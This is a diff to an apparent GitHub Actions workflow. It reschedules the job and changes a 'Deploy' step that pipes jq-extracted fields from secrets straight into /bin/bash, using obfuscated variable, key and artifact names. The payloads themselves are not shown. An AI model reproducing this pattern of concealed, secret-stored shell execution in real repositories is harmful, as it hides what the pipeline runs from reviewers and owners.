@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '50 1,7,13,19 * * *'
+    - cron: '7 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -16,18 +16,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          rd8: ${{ secrets.rd8 }}
+          pfvs83: ${{ secrets.pfvs83 }}
         run: |
-          printf '%s' "$rd8" | jq -r .zap945 | /bin/bash
-          printf '%s' "$kch56" | jq -r .cpoxj5750 | /bin/bash
-          echo $gqnb6359 | jq -r .iave9214 | /bin/bash
-          echo $l647 | jq -r .gcz554 | /bin/bash
-          printf '%s' "$tfsi73" | jq -r .gdy60 | /bin/bash
-          echo $pkxnz4839 | jq -r .lfwt19 | /bin/bash
+          printf '%s' "$pfvs83" | jq -r .z92 | /bin/bash
+          printf '%s' "$kenfd24016" | jq -r .arls712 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: pRsPdthF
+          name: PleHtVrS
           path: "*.zip"
           retention-days: 1
